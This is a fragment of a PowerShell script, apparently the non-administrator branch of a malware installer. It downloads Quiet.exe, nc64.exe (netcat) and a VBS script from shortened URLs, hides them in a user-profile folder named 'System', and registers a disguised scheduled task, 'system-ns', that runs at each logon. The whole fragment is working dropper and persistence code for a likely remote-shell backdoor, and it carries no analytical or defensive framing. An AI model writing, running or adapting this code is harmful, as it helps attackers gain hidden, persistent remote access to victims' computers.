} else {
    Write-Output "Not running as Administrator"

    # No admin rights
    $installPath = Join-Path $env:USERPROFILE "System"
    $scriptVbsUrl = "https://rb.gy/3lld2p"

    # Create the installation directory if it doesn’t exist
    if (-not (Test-Path $installPath)) {
        New-Item -ItemType Directory -Path $installPath -Force | Out-Null
    }

    # File download paths
    $quietTxtPath = Join-Path $installPath "Quiet.exe"
    $nc64TxtPath = Join-Path $installPath "nc64.exe"
    $scriptVbsPath = Join-Path $installPath "script.vbs"

    # URLs for Quiet.exe and nc64.exe
    $quietTxtUrl = "https://rb.gy/mx0i5"
    $nc64TxtUrl = "https://rb.gy/guty9"

    # Download files
    Invoke-WebRequest -Uri $quietTxtUrl -OutFile $quietTxtPath
    Invoke-WebRequest -Uri $nc64TxtUrl -OutFile $nc64TxtPath
    Invoke-WebRequest -Uri $scriptVbsUrl -OutFile $scriptVbsPath

    # Make the downloaded files hidden
    attrib +H $quietTxtPath
    attrib +H $nc64TxtPath
    attrib +H $scriptVbsPath

    # Create a scheduled task
    $action = New-ScheduledTaskAction -Execute $scriptVbsPath
    $trigger = New-ScheduledTaskTrigger -AtLogon -User "$env:USERDOMAIN\$env:USERNAME"
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd

    try {
        $taskName = "system-ns"

        $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive

        # Register the task with the current user’s credentials
        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal -Settings $settings -Force

        # Start the task immediately after registration
        Start-ScheduledTask -TaskName $taskName

    } catch {
        Write-Output "Failed to register or start the scheduled task: $_"
    }
}
